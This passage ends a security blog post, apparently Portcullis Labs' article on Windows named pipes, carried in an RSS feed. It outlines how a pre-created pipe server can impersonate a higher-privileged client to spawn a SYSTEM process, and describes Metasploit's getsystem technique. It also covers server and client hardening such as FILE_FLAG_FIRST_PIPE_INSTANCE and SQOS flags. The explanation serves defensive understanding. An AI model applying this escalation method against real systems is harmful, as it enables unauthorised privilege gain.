+<p>If the named pipe server is already running this is not particularly useful as we cannot create the primary server instance which clients will connect to, so it is generally required to preemptively create a named pipe server using the same name as the vulnerable service would normally create. This means that the user needs to know the name of the pipe before the vulnerable service is started and then wait for a client to connect. Ideal targets are services which run at administrator or SYSTEM level privileges, for the obvious reasons.</p>
+<p>The problem with impersonation tokens begins when a client is running at a higher permission level than the server it is connecting to. If impersonation is allowed, the server can use the impersonation token to act on the client&#8217;s behalf.</p>
+<p>The level of impersonation a server can perform depends on the level of consent a client provides. The client specifies a security quality of service (SQOS) when connecting to the server. The level of impersonation provided to the server by the SQOS can be one of the following four flags, which in the case of named pipes are provided as part of the connection process when calling the CreateFile function:</p>
+<ul>
+<li>SECURITY_ANONYMOUS &#8211; no impersonation allowed at all. The server cannot even identify the client</li>
+<li>SECURITY_IDENTIFICATION &#8211; tmpersonation is not allowed, but the server can identify the client</li>
+<li>SECURITY_IMPERSONATION &#8211; the client can be both identified and impersonated, but only locally (default)</li>
+<li>SECURITY_DELEGATION &#8211; the client can be identified and impersonated, both locally and remotely</li>
+</ul>
+<p>When granted, impersonation tokens can be converted to primary security tokens with ease by calling the DuplicateTokenEx() function. From here it is just a matter of calling the CreateProcessAsUser() function to spawn a process (let’s say cmd.exe) using the new primary token which has the security context of the client.</p>
+<p>Numerous Metasploit modules are available for exploiting named pipe vulnerabilities which have cropped up over the years. For example, the getsystem module in Metasploit makes use of named pipes to escalate to SYSTEM level privileges from Administrator.</p>
+<p>Metasploit includes 2 different techniques which use named pipes to &#8216;get system&#8217;. The first one works by starting a named pipe server and then using administrator privileges to schedule a service to run as SYSTEM. This service connects as a named pipe client to the recently created server. The server impersonates the client and uses this to spawn a SYSTEM process for the meterpreter client.</p>
+<p>The second technique is similar to the first, but instead a DLL is dropped to the hard drive which is then scheduled to run as SYSTEM, this technique is evidently not as clean as the first technique.</p>
+<p>Thanks to Cristian Mikehazi for his prior research in to Metasploit&#8217;s getsystem module which made this section easier to write.</p>
+<h2>Security considerations for Named Pipes / How to make safe pipes</h2>
+<p>The security of named pipes is largely down to the developer and how they choose to implement the server and client sides of the application.</p>
+<p>This is by no means an exhaustive list, but below details some of the good practices which should be considered whenever named pipes are to be deployed.</p>
+<h3>Server side security</h3>
+<p>The named pipe server is responsible for creating and managing a named pipe and its connected clients. Therefore, the most important element is to ensure that the named pipe server is indeed the correct server.</p>
+<p>In this effect, there is an important flag which should be set when attempting to start new named pipe server: FILE_FLAG_FIRST_PIPE_INSTANCE.</p>
+<p>By setting this flag it ensures that if the instance the server is attempting to create is not the first instance of the named pipe, it does not create the instance. In other words, it can give an indication as to whether another process has already created a named pipe server with this name and can allow for corrective action. This could be in the form of creating the server with an alternate name or stopping execution entirely.It is also a good idea that any intended clients are also made aware, if possible, that the server instance is not valid or has been changed so that they do not attempt to connect.</p>
+<p>Further to this, creation of a named pipe server with a pseudo-randomly generated name can assist in ensuring any attempt by an attacker to preemptively create the server process will be unsuccessful. This is an approach the Google Chrome browser uses to help thwart unintended processes from creating the named pipe servers it uses for communication.</p>
+<p>Another important server element is the maximum number of client instances allowed at any one time. If the maximum number of potential clients which will connect is known, a hard figure should be set to ensure that no further clients can connect. The flag which defines the maximum number of concurrent pipe instances is set as an integer value between 1 and 255 at invocation. To allow unlimited connections, the flag is set to PIPE_UNLIMITED_INSTANCES.</p>
+<h3>Client side security</h3>
+<p>Whenever a client pipe is under development, it is extremely important to consider carefully the level of privileges the pipe needs to do its job and to run it at the minimum level required.</p>
+<p>The primary source of exploits against named pipes is through the  impersonation of client privileges by the named pipe server. The easiest and most direct way to prevent a named pipe client from being impersonated is disallow pipe impersonation when connecting to a server. This can be achieved by setting the SECURITY_IDENTIFICATION flag or the SECURITY_ANONYMOUS flag when calling the CreateFile() function as part of the client connection process.</p>
+<p>In cases where impersonation is necessary, there are a number of other ways to ensure that only a legitimate client connects to a server. For example, in a simple application a specific sequence of information could be exchanged between the server and the client (a handshake) before any actual data is exchanged. For more advanced protection, encryption could be used. While not natively supported, public key cryptography (PKI) could be used if implemented correctly. These mechanisms are beyond the scope of this post but are worth bearing in mind.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
